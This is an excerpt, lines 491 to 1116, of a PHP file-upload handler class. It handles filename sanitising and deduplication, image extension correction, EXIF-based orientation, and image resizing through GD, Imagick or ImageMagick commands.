| [491](#L491) | return preg\_replace\_callback( |
| [492](#L492) | '/(?:(?: \(([\d]+)\))?(\.[^.]+))?$/', |
| [493](#L493) | array($this, 'upcount\_name\_callback'), |
| [494](#L494) | $name, |
| [495](#L495) | 1 |
| [496](#L496) | ); |
| [497](#L497) | } |
| [498](#L498) |  |
| [499](#L499) | protected function get\_unique\_filename($file\_path, $name, $size, $type, $error, |
| [500](#L500) | $index, $content\_range) { |
| [501](#L501) | while(is\_dir($this->get\_upload\_path($name))) { |
| [502](#L502) | $name = $this->upcount\_name($name); |
| [503](#L503) | } |
| [504](#L504) | // Keep an existing filename if this is part of a chunked upload: |
| [505](#L505) | $uploaded\_bytes = $this->fix\_integer\_overflow((int)$content\_range[1]); |
| [506](#L506) | while (is\_file($this->get\_upload\_path($name))) { |
| [507](#L507) | if ($uploaded\_bytes === $this->get\_file\_size( |
| [508](#L508) | $this->get\_upload\_path($name))) { |
| [509](#L509) | break; |
| [510](#L510) | } |
| [511](#L511) | $name = $this->upcount\_name($name); |
| [512](#L512) | } |
| [513](#L513) | return $name; |
| [514](#L514) | } |
| [515](#L515) |  |
| [516](#L516) | protected function fix\_file\_extension($file\_path, $name, $size, $type, $error, |
| [517](#L517) | $index, $content\_range) { |
| [518](#L518) | // Add missing file extension for known image types: |
| [519](#L519) | if (strpos($name, '.') === false && |
| [520](#L520) | preg\_match('/^image\/(gif|jpe?g|png)/', $type, $matches)) { |
| [521](#L521) | $name .= '.'.$matches[1]; |
| [522](#L522) | } |
| [523](#L523) | if ($this->options['correct\_image\_extensions'] && |
| [524](#L524) | function\_exists('exif\_imagetype')) { |
| [525](#L525) | switch (@exif\_imagetype($file\_path)){ |
| [526](#L526) | case IMAGETYPE\_JPEG: |
| [527](#L527) | $extensions = array('jpg', 'jpeg'); |
| [528](#L528) | break; |
| [529](#L529) | case IMAGETYPE\_PNG: |
| [530](#L530) | $extensions = array('png'); |
| [531](#L531) | break; |
| [532](#L532) | case IMAGETYPE\_GIF: |
| [533](#L533) | $extensions = array('gif'); |
| [534](#L534) | break; |
| [535](#L535) | } |
| [536](#L536) | // Adjust incorrect image file extensions: |
| [537](#L537) | if (!empty($extensions)) { |
| [538](#L538) | $parts = explode('.', $name); |
| [539](#L539) | $extIndex = count($parts) - 1; |
| [540](#L540) | $ext = strtolower(@$parts[$extIndex]); |
| [541](#L541) | if (!in\_array($ext, $extensions)) { |
| [542](#L542) | $parts[$extIndex] = $extensions[0]; |
| [543](#L543) | $name = implode('.', $parts); |
| [544](#L544) | } |
| [545](#L545) | } |
| [546](#L546) | } |
| [547](#L547) | return $name; |
| [548](#L548) | } |
| [549](#L549) |  |
| [550](#L550) | protected function trim\_file\_name($file\_path, $name, $size, $type, $error, |
| [551](#L551) | $index, $content\_range) { |
| [552](#L552) | // Remove path information and dots around the filename, to prevent uploading |
| [553](#L553) | // into different directories or replacing hidden system files. |
| [554](#L554) | // Also remove control characters and spaces (\x00..\x20) around the filename: |
| [555](#L555) | $name = trim($this->basename(stripslashes($name)), ".\x00..\x20"); |
| [556](#L556) | // Use a timestamp for empty filenames: |
| [557](#L557) | if (!$name) { |
| [558](#L558) | $name = str\_replace('.', '-', microtime(true)); |
| [559](#L559) | } |
| [560](#L560) | return $name; |
| [561](#L561) | } |
| [562](#L562) |  |
| [563](#L563) | protected function get\_file\_name($file\_path, $name, $size, $type, $error, |
| [564](#L564) | $index, $content\_range) { |
| [565](#L565) | $name = $this->trim\_file\_name($file\_path, $name, $size, $type, $error, |
| [566](#L566) | $index, $content\_range); |
| [567](#L567) | return $this->get\_unique\_filename( |
| [568](#L568) | $file\_path, |
| [569](#L569) | $this->fix\_file\_extension($file\_path, $name, $size, $type, $error, |
| [570](#L570) | $index, $content\_range), |
| [571](#L571) | $size, |
| [572](#L572) | $type, |
| [573](#L573) | $error, |
| [574](#L574) | $index, |
| [575](#L575) | $content\_range |
| [576](#L576) | ); |
| [577](#L577) | } |
| [578](#L578) |  |
| [579](#L579) | protected function get\_scaled\_image\_file\_paths($file\_name, $version) { |
| [580](#L580) | $file\_path = $this->get\_upload\_path($file\_name); |
| [581](#L581) | if (!empty($version)) { |
| [582](#L582) | $version\_dir = $this->get\_upload\_path(null, $version); |
| [583](#L583) | if (!is\_dir($version\_dir)) { |
| [584](#L584) | mkdir($version\_dir, $this->options['mkdir\_mode'], true); |
| [585](#L585) | } |
| [586](#L586) | $new\_file\_path = $version\_dir.'/'.$file\_name; |
| [587](#L587) | } else { |
| [588](#L588) | $new\_file\_path = $file\_path; |
| [589](#L589) | } |
| [590](#L590) | return array($file\_path, $new\_file\_path); |
| [591](#L591) | } |
| [592](#L592) |  |
| [593](#L593) | protected function gd\_get\_image\_object($file\_path, $func, $no\_cache = false) { |
| [594](#L594) | if (empty($this->image\_objects[$file\_path]) || $no\_cache) { |
| [595](#L595) | $this->gd\_destroy\_image\_object($file\_path); |
| [596](#L596) | $this->image\_objects[$file\_path] = $func($file\_path); |
| [597](#L597) | } |
| [598](#L598) | return $this->image\_objects[$file\_path]; |
| [599](#L599) | } |
| [600](#L600) |  |
| [601](#L601) | protected function gd\_set\_image\_object($file\_path, $image) { |
| [602](#L602) | $this->gd\_destroy\_image\_object($file\_path); |
| [603](#L603) | $this->image\_objects[$file\_path] = $image; |
| [604](#L604) | } |
| [605](#L605) |  |
| [606](#L606) | protected function gd\_destroy\_image\_object($file\_path) { |
| [607](#L607) | $image = (isset($this->image\_objects[$file\_path])) ? $this->image\_objects[$file\_path] : null ; |
| [608](#L608) | return $image && imagedestroy($image); |
| [609](#L609) | } |
| [610](#L610) |  |
| [611](#L611) | protected function gd\_imageflip($image, $mode) { |
| [612](#L612) | if (function\_exists('imageflip')) { |
| [613](#L613) | return imageflip($image, $mode); |
| [614](#L614) | } |
| [615](#L615) | $new\_width = $src\_width = imagesx($image); |
| [616](#L616) | $new\_height = $src\_height = imagesy($image); |
| [617](#L617) | $new\_img = imagecreatetruecolor($new\_width, $new\_height); |
| [618](#L618) | $src\_x = 0; |
| [619](#L619) | $src\_y = 0; |
| [620](#L620) | switch ($mode) { |
| [621](#L621) | case '1': // flip on the horizontal axis |
| [622](#L622) | $src\_y = $new\_height - 1; |
| [623](#L623) | $src\_height = -$new\_height; |
| [624](#L624) | break; |
| [625](#L625) | case '2': // flip on the vertical axis |
| [626](#L626) | $src\_x  = $new\_width - 1; |
| [627](#L627) | $src\_width = -$new\_width; |
| [628](#L628) | break; |
| [629](#L629) | case '3': // flip on both axes |
| [630](#L630) | $src\_y = $new\_height - 1; |
| [631](#L631) | $src\_height = -$new\_height; |
| [632](#L632) | $src\_x  = $new\_width - 1; |
| [633](#L633) | $src\_width = -$new\_width; |
| [634](#L634) | break; |
| [635](#L635) | default: |
| [636](#L636) | return $image; |
| [637](#L637) | } |
| [638](#L638) | imagecopyresampled( |
| [639](#L639) | $new\_img, |
| [640](#L640) | $image, |
| [641](#L641) | 0, |
| [642](#L642) | 0, |
| [643](#L643) | $src\_x, |
| [644](#L644) | $src\_y, |
| [645](#L645) | $new\_width, |
| [646](#L646) | $new\_height, |
| [647](#L647) | $src\_width, |
| [648](#L648) | $src\_height |
| [649](#L649) | ); |
| [650](#L650) | return $new\_img; |
| [651](#L651) | } |
| [652](#L652) |  |
| [653](#L653) | protected function gd\_orient\_image($file\_path, $src\_img) { |
| [654](#L654) | if (!function\_exists('exif\_read\_data')) { |
| [655](#L655) | return false; |
| [656](#L656) | } |
| [657](#L657) | $exif = @exif\_read\_data($file\_path); |
| [658](#L658) | if ($exif === false) { |
| [659](#L659) | return false; |
| [660](#L660) | } |
| [661](#L661) | $orientation = (int)@$exif['Orientation']; |
| [662](#L662) | if ($orientation < 2 || $orientation > 8) { |
| [663](#L663) | return false; |
| [664](#L664) | } |
| [665](#L665) | switch ($orientation) { |
| [666](#L666) | case 2: |
| [667](#L667) | $new\_img = $this->gd\_imageflip( |
| [668](#L668) | $src\_img, |
| [669](#L669) | defined('IMG\_FLIP\_VERTICAL') ? IMG\_FLIP\_VERTICAL : 2 |
| [670](#L670) | ); |
| [671](#L671) | break; |
| [672](#L672) | case 3: |
| [673](#L673) | $new\_img = imagerotate($src\_img, 180, 0); |
| [674](#L674) | break; |
| [675](#L675) | case 4: |
| [676](#L676) | $new\_img = $this->gd\_imageflip( |
| [677](#L677) | $src\_img, |
| [678](#L678) | defined('IMG\_FLIP\_HORIZONTAL') ? IMG\_FLIP\_HORIZONTAL : 1 |
| [679](#L679) | ); |
| [680](#L680) | break; |
| [681](#L681) | case 5: |
| [682](#L682) | $tmp\_img = $this->gd\_imageflip( |
| [683](#L683) | $src\_img, |
| [684](#L684) | defined('IMG\_FLIP\_HORIZONTAL') ? IMG\_FLIP\_HORIZONTAL : 1 |
| [685](#L685) | ); |
| [686](#L686) | $new\_img = imagerotate($tmp\_img, 270, 0); |
| [687](#L687) | imagedestroy($tmp\_img); |
| [688](#L688) | break; |
| [689](#L689) | case 6: |
| [690](#L690) | $new\_img = imagerotate($src\_img, 270, 0); |
| [691](#L691) | break; |
| [692](#L692) | case 7: |
| [693](#L693) | $tmp\_img = $this->gd\_imageflip( |
| [694](#L694) | $src\_img, |
| [695](#L695) | defined('IMG\_FLIP\_VERTICAL') ? IMG\_FLIP\_VERTICAL : 2 |
| [696](#L696) | ); |
| [697](#L697) | $new\_img = imagerotate($tmp\_img, 270, 0); |
| [698](#L698) | imagedestroy($tmp\_img); |
| [699](#L699) | break; |
| [700](#L700) | case 8: |
| [701](#L701) | $new\_img = imagerotate($src\_img, 90, 0); |
| [702](#L702) | break; |
| [703](#L703) | default: |
| [704](#L704) | return false; |
| [705](#L705) | } |
| [706](#L706) | $this->gd\_set\_image\_object($file\_path, $new\_img); |
| [707](#L707) | return true; |
| [708](#L708) | } |
| [709](#L709) |  |
| [710](#L710) | protected function gd\_create\_scaled\_image($file\_name, $version, $options) { |
| [711](#L711) | if (!function\_exists('imagecreatetruecolor')) { |
| [712](#L712) | error\_log('Function not found: imagecreatetruecolor'); |
| [713](#L713) | return false; |
| [714](#L714) | } |
| [715](#L715) | list($file\_path, $new\_file\_path) = |
| [716](#L716) | $this->get\_scaled\_image\_file\_paths($file\_name, $version); |
| [717](#L717) | $type = strtolower(substr(strrchr($file\_name, '.'), 1)); |
| [718](#L718) | switch ($type) { |
| [719](#L719) | case 'jpg': |
| [720](#L720) | case 'jpeg': |
| [721](#L721) | $src\_func = 'imagecreatefromjpeg'; |
| [722](#L722) | $write\_func = 'imagejpeg'; |
| [723](#L723) | $image\_quality = isset($options['jpeg\_quality']) ? |
| [724](#L724) | $options['jpeg\_quality'] : 75; |
| [725](#L725) | break; |
| [726](#L726) | case 'gif': |
| [727](#L727) | $src\_func = 'imagecreatefromgif'; |
| [728](#L728) | $write\_func = 'imagegif'; |
| [729](#L729) | $image\_quality = null; |
| [730](#L730) | break; |
| [731](#L731) | case 'png': |
| [732](#L732) | $src\_func = 'imagecreatefrompng'; |
| [733](#L733) | $write\_func = 'imagepng'; |
| [734](#L734) | $image\_quality = isset($options['png\_quality']) ? |
| [735](#L735) | $options['png\_quality'] : 9; |
| [736](#L736) | break; |
| [737](#L737) | default: |
| [738](#L738) | return false; |
| [739](#L739) | } |
| [740](#L740) | $src\_img = $this->gd\_get\_image\_object( |
| [741](#L741) | $file\_path, |
| [742](#L742) | $src\_func, |
| [743](#L743) | !empty($options['no\_cache']) |
| [744](#L744) | ); |
| [745](#L745) | $image\_oriented = false; |
| [746](#L746) | if (!empty($options['auto\_orient']) && $this->gd\_orient\_image( |
| [747](#L747) | $file\_path, |
| [748](#L748) | $src\_img |
| [749](#L749) | )) { |
| [750](#L750) | $image\_oriented = true; |
| [751](#L751) | $src\_img = $this->gd\_get\_image\_object( |
| [752](#L752) | $file\_path, |
| [753](#L753) | $src\_func |
| [754](#L754) | ); |
| [755](#L755) | } |
| [756](#L756) | $max\_width = $img\_width = imagesx($src\_img); |
| [757](#L757) | $max\_height = $img\_height = imagesy($src\_img); |
| [758](#L758) | if (!empty($options['max\_width'])) { |
| [759](#L759) | $max\_width = $options['max\_width']; |
| [760](#L760) | } |
| [761](#L761) | if (!empty($options['max\_height'])) { |
| [762](#L762) | $max\_height = $options['max\_height']; |
| [763](#L763) | } |
| [764](#L764) | $scale = min( |
| [765](#L765) | $max\_width / $img\_width, |
| [766](#L766) | $max\_height / $img\_height |
| [767](#L767) | ); |
| [768](#L768) | if ($scale >= 1) { |
| [769](#L769) | if ($image\_oriented) { |
| [770](#L770) | return $write\_func($src\_img, $new\_file\_path, $image\_quality); |
| [771](#L771) | } |
| [772](#L772) | if ($file\_path !== $new\_file\_path) { |
| [773](#L773) | return copy($file\_path, $new\_file\_path); |
| [774](#L774) | } |
| [775](#L775) | return true; |
| [776](#L776) | } |
| [777](#L777) | if (empty($options['crop'])) { |
| [778](#L778) | $new\_width = $img\_width \* $scale; |
| [779](#L779) | $new\_height = $img\_height \* $scale; |
| [780](#L780) | $dst\_x = 0; |
| [781](#L781) | $dst\_y = 0; |
| [782](#L782) | $new\_img = imagecreatetruecolor($new\_width, $new\_height); |
| [783](#L783) | } else { |
| [784](#L784) | if (($img\_width / $img\_height) >= ($max\_width / $max\_height)) { |
| [785](#L785) | $new\_width = $img\_width / ($img\_height / $max\_height); |
| [786](#L786) | $new\_height = $max\_height; |
| [787](#L787) | } else { |
| [788](#L788) | $new\_width = $max\_width; |
| [789](#L789) | $new\_height = $img\_height / ($img\_width / $max\_width); |
| [790](#L790) | } |
| [791](#L791) | $dst\_x = 0 - ($new\_width - $max\_width) / 2; |
| [792](#L792) | $dst\_y = 0 - ($new\_height - $max\_height) / 2; |
| [793](#L793) | $new\_img = imagecreatetruecolor($max\_width, $max\_height); |
| [794](#L794) | } |
| [795](#L795) | // Handle transparency in GIF and PNG images: |
| [796](#L796) | switch ($type) { |
| [797](#L797) | case 'gif': |
| [798](#L798) | case 'png': |
| [799](#L799) | imagecolortransparent($new\_img, imagecolorallocate($new\_img, 0, 0, 0)); |
| [800](#L800) | case 'png': |
| [801](#L801) | imagealphablending($new\_img, false); |
| [802](#L802) | imagesavealpha($new\_img, true); |
| [803](#L803) | break; |
| [804](#L804) | } |
| [805](#L805) | $success = imagecopyresampled( |
| [806](#L806) | $new\_img, |
| [807](#L807) | $src\_img, |
| [808](#L808) | $dst\_x, |
| [809](#L809) | $dst\_y, |
| [810](#L810) | 0, |
| [811](#L811) | 0, |
| [812](#L812) | $new\_width, |
| [813](#L813) | $new\_height, |
| [814](#L814) | $img\_width, |
| [815](#L815) | $img\_height |
| [816](#L816) | ) && $write\_func($new\_img, $new\_file\_path, $image\_quality); |
| [817](#L817) | $this->gd\_set\_image\_object($file\_path, $new\_img); |
| [818](#L818) | return $success; |
| [819](#L819) | } |
| [820](#L820) |  |
| [821](#L821) | protected function imagick\_get\_image\_object($file\_path, $no\_cache = false) { |
| [822](#L822) | if (empty($this->image\_objects[$file\_path]) || $no\_cache) { |
| [823](#L823) | $this->imagick\_destroy\_image\_object($file\_path); |
| [824](#L824) | $image = new \Imagick(); |
| [825](#L825) | if (!empty($this->options['imagick\_resource\_limits'])) { |
| [826](#L826) | foreach ($this->options['imagick\_resource\_limits'] as $type => $limit) { |
| [827](#L827) | $image->setResourceLimit($type, $limit); |
| [828](#L828) | } |
| [829](#L829) | } |
| [830](#L830) | $image->readImage($file\_path); |
| [831](#L831) | $this->image\_objects[$file\_path] = $image; |
| [832](#L832) | } |
| [833](#L833) | return $this->image\_objects[$file\_path]; |
| [834](#L834) | } |
| [835](#L835) |  |
| [836](#L836) | protected function imagick\_set\_image\_object($file\_path, $image) { |
| [837](#L837) | $this->imagick\_destroy\_image\_object($file\_path); |
| [838](#L838) | $this->image\_objects[$file\_path] = $image; |
| [839](#L839) | } |
| [840](#L840) |  |
| [841](#L841) | protected function imagick\_destroy\_image\_object($file\_path) { |
| [842](#L842) | $image = (isset($this->image\_objects[$file\_path])) ? $this->image\_objects[$file\_path] : null ; |
| [843](#L843) | return $image && $image->destroy(); |
| [844](#L844) | } |
| [845](#L845) |  |
| [846](#L846) | protected function imagick\_orient\_image($image) { |
| [847](#L847) | $orientation = $image->getImageOrientation(); |
| [848](#L848) | $background = new \ImagickPixel('none'); |
| [849](#L849) | switch ($orientation) { |
| [850](#L850) | case \imagick::ORIENTATION\_TOPRIGHT: // 2 |
| [851](#L851) | $image->flopImage(); // horizontal flop around y-axis |
| [852](#L852) | break; |
| [853](#L853) | case \imagick::ORIENTATION\_BOTTOMRIGHT: // 3 |
| [854](#L854) | $image->rotateImage($background, 180); |
| [855](#L855) | break; |
| [856](#L856) | case \imagick::ORIENTATION\_BOTTOMLEFT: // 4 |
| [857](#L857) | $image->flipImage(); // vertical flip around x-axis |
| [858](#L858) | break; |
| [859](#L859) | case \imagick::ORIENTATION\_LEFTTOP: // 5 |
| [860](#L860) | $image->flopImage(); // horizontal flop around y-axis |
| [861](#L861) | $image->rotateImage($background, 270); |
| [862](#L862) | break; |
| [863](#L863) | case \imagick::ORIENTATION\_RIGHTTOP: // 6 |
| [864](#L864) | $image->rotateImage($background, 90); |
| [865](#L865) | break; |
| [866](#L866) | case \imagick::ORIENTATION\_RIGHTBOTTOM: // 7 |
| [867](#L867) | $image->flipImage(); // vertical flip around x-axis |
| [868](#L868) | $image->rotateImage($background, 270); |
| [869](#L869) | break; |
| [870](#L870) | case \imagick::ORIENTATION\_LEFTBOTTOM: // 8 |
| [871](#L871) | $image->rotateImage($background, 270); |
| [872](#L872) | break; |
| [873](#L873) | default: |
| [874](#L874) | return false; |
| [875](#L875) | } |
| [876](#L876) | $image->setImageOrientation(\imagick::ORIENTATION\_TOPLEFT); // 1 |
| [877](#L877) | return true; |
| [878](#L878) | } |
| [879](#L879) |  |
| [880](#L880) | protected function imagick\_create\_scaled\_image($file\_name, $version, $options) { |
| [881](#L881) | list($file\_path, $new\_file\_path) = |
| [882](#L882) | $this->get\_scaled\_image\_file\_paths($file\_name, $version); |
| [883](#L883) | $image = $this->imagick\_get\_image\_object( |
| [884](#L884) | $file\_path, |
| [885](#L885) | !empty($options['crop']) || !empty($options['no\_cache']) |
| [886](#L886) | ); |
| [887](#L887) | if ($image->getImageFormat() === 'GIF') { |
| [888](#L888) | // Handle animated GIFs: |
| [889](#L889) | $images = $image->coalesceImages(); |
| [890](#L890) | foreach ($images as $frame) { |
| [891](#L891) | $image = $frame; |
| [892](#L892) | $this->imagick\_set\_image\_object($file\_name, $image); |
| [893](#L893) | break; |
| [894](#L894) | } |
| [895](#L895) | } |
| [896](#L896) | $image\_oriented = false; |
| [897](#L897) | if (!empty($options['auto\_orient'])) { |
| [898](#L898) | $image\_oriented = $this->imagick\_orient\_image($image); |
| [899](#L899) | } |
| [900](#L900) | $new\_width = $max\_width = $img\_width = $image->getImageWidth(); |
| [901](#L901) | $new\_height = $max\_height = $img\_height = $image->getImageHeight(); |
| [902](#L902) | if (!empty($options['max\_width'])) { |
| [903](#L903) | $new\_width = $max\_width = $options['max\_width']; |
| [904](#L904) | } |
| [905](#L905) | if (!empty($options['max\_height'])) { |
| [906](#L906) | $new\_height = $max\_height = $options['max\_height']; |
| [907](#L907) | } |
| [908](#L908) | $image\_strip = false; |
| [909](#L909) | if( !empty($options["strip"]) ) { |
| [910](#L910) | $image\_strip = $options["strip"]; |
| [911](#L911) | } |
| [912](#L912) | if ( !$image\_oriented && ($max\_width >= $img\_width) && ($max\_height >= $img\_height) && !$image\_strip && empty($options["jpeg\_quality"]) ) { |
| [913](#L913) | if ($file\_path !== $new\_file\_path) { |
| [914](#L914) | return copy($file\_path, $new\_file\_path); |
| [915](#L915) | } |
| [916](#L916) | return true; |
| [917](#L917) | } |
| [918](#L918) | $crop = !empty($options['crop']); |
| [919](#L919) | if ($crop) { |
| [920](#L920) | $x = 0; |
| [921](#L921) | $y = 0; |
| [922](#L922) | if (($img\_width / $img\_height) >= ($max\_width / $max\_height)) { |
| [923](#L923) | $new\_width = 0; // Enables proportional scaling based on max\_height |
| [924](#L924) | $x = ($img\_width / ($img\_height / $max\_height) - $max\_width) / 2; |
| [925](#L925) | } else { |
| [926](#L926) | $new\_height = 0; // Enables proportional scaling based on max\_width |
| [927](#L927) | $y = ($img\_height / ($img\_width / $max\_width) - $max\_height) / 2; |
| [928](#L928) | } |
| [929](#L929) | } |
| [930](#L930) | $success = $image->resizeImage( |
| [931](#L931) | $new\_width, |
| [932](#L932) | $new\_height, |
| [933](#L933) | isset($options['filter']) ? $options['filter'] : \imagick::FILTER\_LANCZOS, |
| [934](#L934) | isset($options['blur']) ? $options['blur'] : 1, |
| [935](#L935) | $new\_width && $new\_height // fit image into constraints if not to be cropped |
| [936](#L936) | ); |
| [937](#L937) | if ($success && $crop) { |
| [938](#L938) | $success = $image->cropImage( |
| [939](#L939) | $max\_width, |
| [940](#L940) | $max\_height, |
| [941](#L941) | $x, |
| [942](#L942) | $y |
| [943](#L943) | ); |
| [944](#L944) | if ($success) { |
| [945](#L945) | $success = $image->setImagePage($max\_width, $max\_height, 0, 0); |
| [946](#L946) | } |
| [947](#L947) | } |
| [948](#L948) | $type = strtolower(substr(strrchr($file\_name, '.'), 1)); |
| [949](#L949) | switch ($type) { |
| [950](#L950) | case 'jpg': |
| [951](#L951) | case 'jpeg': |
| [952](#L952) | if (!empty($options['jpeg\_quality'])) { |
| [953](#L953) | $image->setImageCompression(\imagick::COMPRESSION\_JPEG); |
| [954](#L954) | $image->setImageCompressionQuality($options['jpeg\_quality']); |
| [955](#L955) | } |
| [956](#L956) | break; |
| [957](#L957) | } |
| [958](#L958) | if ( $image\_strip ) { |
| [959](#L959) | $image->stripImage(); |
| [960](#L960) | } |
| [961](#L961) | return $success && $image->writeImage($new\_file\_path); |
| [962](#L962) | } |
| [963](#L963) |  |
| [964](#L964) | protected function imagemagick\_create\_scaled\_image($file\_name, $version, $options) { |
| [965](#L965) | list($file\_path, $new\_file\_path) = |
| [966](#L966) | $this->get\_scaled\_image\_file\_paths($file\_name, $version); |
| [967](#L967) | $resize = @$options['max\_width'] |
| [968](#L968) | .(empty($options['max\_height']) ? '' : 'X'.$options['max\_height']); |
| [969](#L969) | if (!$resize && empty($options['auto\_orient'])) { |
| [970](#L970) | if ($file\_path !== $new\_file\_path) { |
| [971](#L971) | return copy($file\_path, $new\_file\_path); |
| [972](#L972) | } |
| [973](#L973) | return true; |
| [974](#L974) | } |
| [975](#L975) | $cmd = $this->options['convert\_bin']; |
| [976](#L976) | if (!empty($this->options['convert\_params'])) { |
| [977](#L977) | $cmd .= ' '.$this->options['convert\_params']; |
| [978](#L978) | } |
| [979](#L979) | $cmd .= ' '.escapeshellarg($file\_path); |
| [980](#L980) | if (!empty($options['auto\_orient'])) { |
| [981](#L981) | $cmd .= ' -auto-orient'; |
| [982](#L982) | } |
| [983](#L983) | if ($resize) { |
| [984](#L984) | // Handle animated GIFs: |
| [985](#L985) | $cmd .= ' -coalesce'; |
| [986](#L986) | if (empty($options['crop'])) { |
| [987](#L987) | $cmd .= ' -resize '.escapeshellarg($resize.'>'); |
| [988](#L988) | } else { |
| [989](#L989) | $cmd .= ' -resize '.escapeshellarg($resize.'^'); |
| [990](#L990) | $cmd .= ' -gravity center'; |
| [991](#L991) | $cmd .= ' -crop '.escapeshellarg($resize.'+0+0'); |
| [992](#L992) | } |
| [993](#L993) | // Make sure the page dimensions are correct (fixes offsets of animated GIFs): |
| [994](#L994) | $cmd .= ' +repage'; |
| [995](#L995) | } |
| [996](#L996) | if (!empty($options['convert\_params'])) { |
| [997](#L997) | $cmd .= ' '.$options['convert\_params']; |
| [998](#L998) | } |
| [999](#L999) | $cmd .= ' '.escapeshellarg($new\_file\_path); |
| [1000](#L1000) | exec($cmd, $output, $error); |
| [1001](#L1001) | if ($error) { |
| [1002](#L1002) | error\_log(implode('\n', $output)); |
| [1003](#L1003) | return false; |
| [1004](#L1004) | } |
| [1005](#L1005) | return true; |
| [1006](#L1006) | } |
| [1007](#L1007) |  |
| [1008](#L1008) | protected function get\_image\_size($file\_path) { |
| [1009](#L1009) | if ($this->options['image\_library']) { |
| [1010](#L1010) | if (extension\_loaded('imagick')) { |
| [1011](#L1011) | $image = new \Imagick(); |
| [1012](#L1012) | try { |
| [1013](#L1013) | if (@$image->pingImage($file\_path)) { |
| [1014](#L1014) | $dimensions = array($image->getImageWidth(), $image->getImageHeight()); |
| [1015](#L1015) | $image->destroy(); |
| [1016](#L1016) | return $dimensions; |
| [1017](#L1017) | } |
| [1018](#L1018) | return false; |
| [1019](#L1019) | } catch (\Exception $e) { |
| [1020](#L1020) | error\_log($e->getMessage()); |
| [1021](#L1021) | } |
| [1022](#L1022) | } |
| [1023](#L1023) | if ($this->options['image\_library'] === 2) { |
| [1024](#L1024) | $cmd = $this->options['identify\_bin']; |
| [1025](#L1025) | $cmd .= ' -ping '.escapeshellarg($file\_path); |
| [1026](#L1026) | exec($cmd, $output, $error); |
| [1027](#L1027) | if (!$error && !empty($output)) { |
| [1028](#L1028) | // image.jpg JPEG 1920x1080 1920x1080+0+0 8-bit sRGB 465KB 0.000u 0:00.000 |
| [1029](#L1029) | $infos = preg\_split('/\s+/', substr($output[0], strlen($file\_path))); |
| [1030](#L1030) | $dimensions = preg\_split('/x/', $infos[2]); |
| [1031](#L1031) | return $dimensions; |
| [1032](#L1032) | } |
| [1033](#L1033) | return false; |
| [1034](#L1034) | } |
| [1035](#L1035) | } |
| [1036](#L1036) | if (!function\_exists('getimagesize')) { |
| [1037](#L1037) | error\_log('Function not found: getimagesize'); |
| [1038](#L1038) | return false; |
| [1039](#L1039) | } |
| [1040](#L1040) | return @getimagesize($file\_path); |
| [1041](#L1041) | } |
| [1042](#L1042) |  |
| [1043](#L1043) | protected function create\_scaled\_image($file\_name, $version, $options) { |
| [1044](#L1044) | if ($this->options['image\_library'] === 2) { |
| [1045](#L1045) | return $this->imagemagick\_create\_scaled\_image($file\_name, $version, $options); |
| [1046](#L1046) | } |
| [1047](#L1047) | if ($this->options['image\_library'] && extension\_loaded('imagick')) { |
| [1048](#L1048) | return $this->imagick\_create\_scaled\_image($file\_name, $version, $options); |
| [1049](#L1049) | } |
| [1050](#L1050) | return $this->gd\_create\_scaled\_image($file\_name, $version, $options); |
| [1051](#L1051) | } |
| [1052](#L1052) |  |
| [1053](#L1053) | protected function destroy\_image\_object($file\_path) { |
| [1054](#L1054) | if ($this->options['image\_library'] && extension\_loaded('imagick')) { |
| [1055](#L1055) | return $this->imagick\_destroy\_image\_object($file\_path); |
| [1056](#L1056) | } |
| [1057](#L1057) | } |
| [1058](#L1058) |  |
| [1059](#L1059) | protected function is\_valid\_image\_file($file\_path) { |
| [1060](#L1060) | if (!preg\_match($this->options['image\_file\_types'], $file\_path)) { |
| [1061](#L1061) | return false; |
| [1062](#L1062) | } |
| [1063](#L1063) | if (function\_exists('exif\_imagetype')) { |
| [1064](#L1064) | return @exif\_imagetype($file\_path); |
| [1065](#L1065) | } |
| [1066](#L1066) | $image\_info = $this->get\_image\_size($file\_path); |
| [1067](#L1067) | return $image\_info && $image\_info[0] && $image\_info[1]; |
| [1068](#L1068) | } |
| [1069](#L1069) |  |
| [1070](#L1070) | protected function handle\_image\_file($file\_path, $file) { |
| [1071](#L1071) | $failed\_versions = array(); |
| [1072](#L1072) | foreach ($this->options['image\_versions'] as $version => $options) { |
| [1073](#L1073) | if ($this->create\_scaled\_image($file->name, $version, $options)) { |
| [1074](#L1074) | if (!empty($version)) { |
| [1075](#L1075) | $file->{$version.'Url'} = $this->get\_download\_url( |
| [1076](#L1076) | $file->name, |
| [1077](#L1077) | $version |
| [1078](#L1078) | ); |
| [1079](#L1079) | } else { |
| [1080](#L1080) | $file->size = $this->get\_file\_size($file\_path, true); |
| [1081](#L1081) | } |
| [1082](#L1082) | } else { |
| [1083](#L1083) | $failed\_versions[] = $version ? $version : 'original'; |
| [1084](#L1084) | } |
| [1085](#L1085) | } |
| [1086](#L1086) | if (count($failed\_versions)) { |
| [1087](#L1087) | $file->error = $this->get\_error\_message('image\_resize') |
| [1088](#L1088) | .' ('.implode($failed\_versions, ', ').')'; |
| [1089](#L1089) | } |
| [1090](#L1090) | // Free memory: |
| [1091](#L1091) | $this->destroy\_image\_object($file\_path); |
| [1092](#L1092) | } |
| [1093](#L1093) |  |
| [1094](#L1094) | protected function handle\_file\_upload($uploaded\_file, $name, $size, $type, $error, |
| [1095](#L1095) | $index = null, $content\_range = null) { |
| [1096](#L1096) | $file = new \stdClass(); |
| [1097](#L1097) | $file->name = $this->get\_file\_name($uploaded\_file, $name, $size, $type, $error, |
| [1098](#L1098) | $index, $content\_range); |
| [1099](#L1099) | $file->size = $this->fix\_integer\_overflow((int)$size); |
| [1100](#L1100) | $file->type = $type; |
| [1101](#L1101) | if ($this->validate($uploaded\_file, $file, $error, $index)) { |
| [1102](#L1102) | $this->handle\_form\_data($file, $index); |
| [1103](#L1103) | $upload\_dir = $this->get\_upload\_path(); |
| [1104](#L1104) | if (!is\_dir($upload\_dir)) { |
| [1105](#L1105) | mkdir($upload\_dir, $this->options['mkdir\_mode'], true); |
| [1106](#L1106) | } |
| [1107](#L1107) | $file\_path = $this->get\_upload\_path($file->name); |
| [1108](#L1108) | $append\_file = $content\_range && is\_file($file\_path) && |
| [1109](#L1109) | $file->size > $this->get\_file\_size($file\_path); |
| [1110](#L1110) | if ($uploaded\_file && is\_uploaded\_file($uploaded\_file)) { |
| [1111](#L1111) | // multipart/formdata uploads (POST method uploads) |
| [1112](#L1112) | if ($append\_file) { |
| [1113](#L1113) | file\_put\_contents( |
| [1114](#L1114) | $file\_path, |
| [1115](#L1115) | fopen($uploaded\_file, 'r'), |
| [1116](#L1116) | FILE\_APPEND |
